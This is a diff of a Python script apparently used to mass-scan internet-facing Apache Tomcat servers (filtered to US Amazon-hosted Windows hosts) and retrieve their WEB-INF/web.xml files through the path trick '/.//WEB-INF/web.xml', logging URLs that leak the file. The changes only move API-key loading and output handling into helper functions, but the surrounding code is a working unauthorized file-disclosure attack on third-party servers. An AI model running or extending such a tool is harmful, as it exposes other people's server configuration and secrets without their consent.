@@ -14,7 +14,13 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOUR APIKEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = 'country:"US" org:"Amazon.com" product:"Apache Tomcat/Coyote JSP engine" os:"Windows 7 or 8"'
 FILE = "/.//WEB-INF/web.xml"
 session = requests.Session()
@@ -38,7 +44,7 @@ def grab_file (IP,PORT,FILE):
 		response = session.get(URL, headers=headers, timeout=10, verify=False)
 		if 'web-app' in response.text:
 			if 'java.sun.com' in response.text:
-				text_file = open("./cfg/tomcat.cfg", "a")
+				text_file = open_output("cfg/tomcat.cfg", "a")
 				text_file.write(""+URL+"\n")
 				text_file.close()
 				print ("[*] Web.xml... Found [*]\n")
